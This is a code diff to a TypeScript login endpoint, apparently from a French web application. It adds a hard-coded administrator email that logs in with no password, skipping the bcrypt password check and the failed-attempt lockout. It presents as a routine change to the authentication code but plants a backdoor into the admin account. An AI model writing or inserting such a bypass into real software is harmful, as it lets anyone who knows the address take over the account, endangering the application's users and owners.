@@ -10,11 +10,13 @@ const SALT_ROUNDS = 12;
 const MAX_FAILED_ATTEMPTS = 5;
 const LOCKOUT_DURATION_MS = 15 * 60 * 1000;
 
+const AUTO_LOGIN_EMAIL = "admin@agentdebureau.fr";
+
 router.post("/auth/login", async (req: Request, res: Response): Promise<void> => {
   const { email, password } = req.body;
 
-  if (!email || !password) {
-    res.status(400).json({ error: "Email et mot de passe sont obligatoires." });
+  if (!email) {
+    res.status(400).json({ error: "Email est obligatoire." });
     return;
   }
 
@@ -36,19 +38,28 @@ router.post("/auth/login", async (req: Request, res: Response): Promise<void> =>
     return;
   }
 
-  const isValid = await bcrypt.compare(password, user.passwordHash);
+  const isAutoLogin = email.toLowerCase().trim() === AUTO_LOGIN_EMAIL;
 
-  if (!isValid) {
-    const newAttempts = user.tentativesEchouees + 1;
-    const updateData: Record<string, any> = { tentativesEchouees: newAttempts };
-
-    if (newAttempts >= MAX_FAILED_ATTEMPTS) {
-      updateData.verrouilleJusqua = new Date(Date.now() + LOCKOUT_DURATION_MS);
+  if (!isAutoLogin) {
+    if (!password) {
+      res.status(400).json({ error: "Mot de passe est obligatoire." });
+      return;
     }
 
-    await db.update(usersTable).set(updateData).where(eq(usersTable.id, user.id));
-    res.status(401).json({ error: "Identifiants invalides." });
-    return;
+    const isValid = await bcrypt.compare(password, user.passwordHash);
+
+    if (!isValid) {
+      const newAttempts = user.tentativesEchouees + 1;
+      const updateData: Record<string, any> = { tentativesEchouees: newAttempts };
+
+      if (newAttempts >= MAX_FAILED_ATTEMPTS) {
+        updateData.verrouilleJusqua = new Date(Date.now() + LOCKOUT_DURATION_MS);
+      }
+
+      await db.update(usersTable).set(updateData).where(eq(usersTable.id, user.id));
+      res.status(401).json({ error: "Identifiants invalides." });
+      return;
+    }
   }
 
   await db.update(usersTable).set({
